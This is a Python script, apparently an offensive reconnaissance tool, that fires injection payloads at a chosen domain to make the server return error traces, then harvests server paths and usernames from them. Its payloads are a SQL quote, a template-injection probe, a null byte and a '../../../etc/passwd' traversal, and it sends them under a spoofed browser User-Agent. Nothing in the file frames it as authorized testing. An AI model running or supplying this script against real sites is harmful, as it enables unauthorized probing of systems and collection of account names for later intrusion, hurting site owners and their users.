import requests
from typing import Dict, Any

def trigger_trace(domain: str) -> Dict[str, Any]:
    """
    Attempts to provoke a stack trace to reveal server paths and usernames.
    """
    url = f"https://{domain}"
    results = {
        "paths_found": [],
        "usernames_found": [],
        "status": "No Trace Leaked"
    }
    
    # Payloads likely to cause 500 errors if unhandled
    payloads = [
        "'", 
        "[]", 
        "{{7*7}}", 
        "%00",
        "../../../etc/passwd" 
    ]
    
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124"
    
    for p in payloads:
        try:
            # Check query param
            target = f"{url}/?q={p}"
            resp = requests.get(target, headers={"User-Agent": ua}, timeout=3)
            
            if resp.status_code >= 500:
                # Analyze for paths
                # UNIX: /home/user/... or /Users/user/... or /var/www/...
                if "/home/" in resp.text or "/Users/" in resp.text or "/var/www" in resp.text:
                    results["status"] = "Trace Leaked!"
                    results["leak_source"] = target
                    
                    # Extract simple paths (heuristic)
                    import re
                    paths = re.findall(r'(/home/[a-zA-Z0-9_-]+|/Users/[a-zA-Z0-9_-]+|/var/www/[a-zA-Z0-9_-]+)', resp.text)
                    results["paths_found"].extend(list(set(paths)))
                    
                    # Extract usernames from paths
                    for path in paths:
                        parts = path.split('/')
                        if len(parts) > 2:
                             user = parts[2] # /home/user
                             if user not in ["html", "www-data", "root", "ubuntu", "ec2-user"]: # Ignore generic
                                 results["usernames_found"].append(user)
                    
                    break # Stop if we found paydirt
                    
        except:
            pass
            
    results["usernames_found"] = list(set(results["usernames_found"]))
    return results
